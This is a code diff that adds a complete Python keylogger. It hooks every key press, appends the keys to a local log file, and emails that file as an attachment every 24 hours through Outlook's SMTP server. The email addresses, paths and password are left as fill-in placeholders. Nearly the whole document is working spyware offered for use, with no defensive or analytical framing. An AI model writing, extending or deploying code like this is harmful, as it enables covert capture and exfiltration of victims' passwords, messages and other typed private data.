@@ -1,0 +1,80 @@
+import os
+import keyboard
+import time
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import sys
+
+
+def create_folder():
+    folder_path = "Your path here"
+    os.makedirs(folder_path, exist_ok=True)
+    print("Folder Created")
+
+
+def key_logger(e):
+    keys_logged = []
+    key = e.name
+    if e.event_type == keyboard.KEY_DOWN:
+        keys_logged.append(key)
+        write_to_file(keys_logged)
+
+
+def write_to_file(keys):
+    file_path = "Your path here\\log.txt"
+    with open(file_path, "a") as file:
+        for key in keys:
+
+            if key == "space":
+                file.write(" ")
+            else:
+                file.write(str(key))
+
+
+create_folder()
+keyboard.hook(key_logger)
+
+
+#####################################################################################################
+
+def send_email():
+    sender_email = "your email here"
+    receiver_email = "your email here"
+    subject = "Scheduled File"
+    body = "File attached."
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    msg['Subject'] = subject
+    msg.attach(MIMEBase('application', 'octet-stream'))
+
+    file_path = "your local path here\\log.txt"
+
+    with open(file_path, 'rb') as attachment:
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', f'attachment; filename= {file_path}')
+    msg.attach(part)
+
+    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
+    server.starttls()
+
+    server.login(sender_email, 'your password here')
+
+    server.sendmail(sender_email, receiver_email, msg.as_string())
+    server.quit()
+    print(" Email sent successfully!")
+
+
+try:
+    while True:
+        time.sleep(86400)
+        send_email()
+
+except KeyboardInterrupt:
+    sys.exit(0)
